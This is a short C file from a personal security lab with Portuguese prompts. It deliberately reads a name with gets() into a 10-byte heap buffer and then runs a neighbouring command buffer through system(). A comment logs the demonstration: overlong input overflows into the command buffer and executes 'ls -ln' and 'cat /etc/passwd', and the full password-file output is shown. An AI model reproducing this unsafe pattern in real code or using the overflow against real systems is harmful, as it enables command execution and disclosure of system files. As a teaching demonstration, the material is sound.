/*
 * 
 * ┌─[mh4]─[mh4x05]─[~/lab/buffer]-#
└──>>./programa 
endereço da variavel Nome:35991568
endereço da variavel comando:35991600
Digite seu nome:Chmod Security teste de bufferovls -ln
Bem vindo: Chmod Security teste de bufferovls -ln
total 12
-rw-rw-r-- 1 1000 1000  350 Jun 10 06:12 buffer.c
-rwxrwxr-x 1 1000 1000 7356 Jun 10 06:12 programa
┌─[mh4]─[mh4x05]─[~/lab/buffer]-#
└──>>./programa 
endereço da variavel Nome:37568528
endereço da variavel comando:37568560
Digite seu nome:Chmod Security teste de bufferovcat /etc/passwd
Bem vindo: Chmod Security teste de bufferovcat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
colord:x:103:108:colord colour management daemon,,,:/var/lib/colord:/bin/false
lightdm:x:104:111:Light Display Manager:/var/lib/lightdm:/bin/false
usbmux:x:105:46:usbmux daemon,,,:/home/usbmux:/bin/false
ntp:x:106:114::/home/ntp:/bin/false
whoopsie:x:107:115::/nonexistent:/bin/false
avahi-autoipd:x:108:117:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:109:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
pulse:x:110:119:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:111:121:RealtimeKit,,,:/proc:/bin/false
speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
saned:x:114:122::/home/saned:/bin/false
mh4:x:1000:1000:mh4x05,,,:/home/mh4:/bin/bash
postgres:x:1001:1002::/home/postgres:/bin/sh
sshd:x:115:65534::/var/run/sshd:/usr/sbin/nologin
debian-xfs:x:116:125::/nonexistent:/bin/false
┌─[mh4]─[mh4x05]─[~/lab/buffer]-#
└──>>
*/
#include<stdio.h>
#include<stdlib.h>
void main (){
  char *nome;
  char *comando;
  nome = (char *)malloc(10);
  comando = (char *)malloc(40);
  printf("endereço da variavel Nome:%d\n",nome);
  printf("endereço da variavel comando:%d\n",comando);
  printf("Digite seu nome:");
  gets(nome);
  printf("Bem vindo: %s\n",nome);
  system(comando); 
}
